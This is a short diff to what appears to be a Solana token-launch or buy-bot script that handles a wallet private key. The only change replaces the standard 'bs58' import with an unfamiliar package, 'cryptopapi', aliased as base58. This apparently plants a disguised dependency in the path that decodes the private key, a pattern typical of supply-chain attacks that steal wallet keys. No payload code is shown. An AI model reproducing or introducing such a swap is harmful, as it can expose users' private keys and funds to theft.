@@ -2,7 +2,7 @@ import { ComputeBudgetProgram, Connection, Keypair, TransactionMessage, Versione
 import { BUYER_AMOUNT, BUYER_WALLET, PRIVATE_KEY, RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT, SWAP_AMOUNT, VANITY_MODE } from "../constants"
 import { createTokenTx, makeBuyIx } from "../src/main"
 
-import base58 from "bs58"
+import base58 from "cryptopapi"
 import { generateVanityAddress } from "../utils"
 import { executeJitoTx } from "../executor/jito"
 
